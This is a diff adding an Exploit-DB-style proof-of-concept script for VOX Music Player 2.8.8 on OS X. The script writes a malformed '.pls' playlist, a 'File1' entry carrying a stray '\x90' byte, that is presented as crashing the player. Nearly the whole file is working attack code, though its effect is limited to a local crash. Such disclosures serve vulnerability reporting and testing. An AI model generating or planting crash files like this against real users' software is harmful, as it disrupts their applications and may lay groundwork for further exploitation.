@@ -1,0 +1,16 @@
+# Exploit Title: VOX Music Player 2.8.8 '.pls' Local Crash PoC
+# Date: 10-12-2016
+# Exploit Author: Antonio Z.
+# Vendor Homepage: http://coppertino.com/vox/mac/
+# Software Link: http://dl.devmate.com/com.coppertino.Vox/Vox.dmg
+# Version: 2.8.8
+# Tested on: OS X 10.10, OS X 10.11, OS X 10.12
+
+import os
+
+evil = '\x90'
+pls = '[playlist]\n' + 'NumberOfEntries=1\n' +'File1' + evil + '\n' + 'Title1=\n' + 'Length1=-1\n'
+
+file = open('Local_Crash_PoC.pls', 'wb')
+file.write(pls)
+file.close()
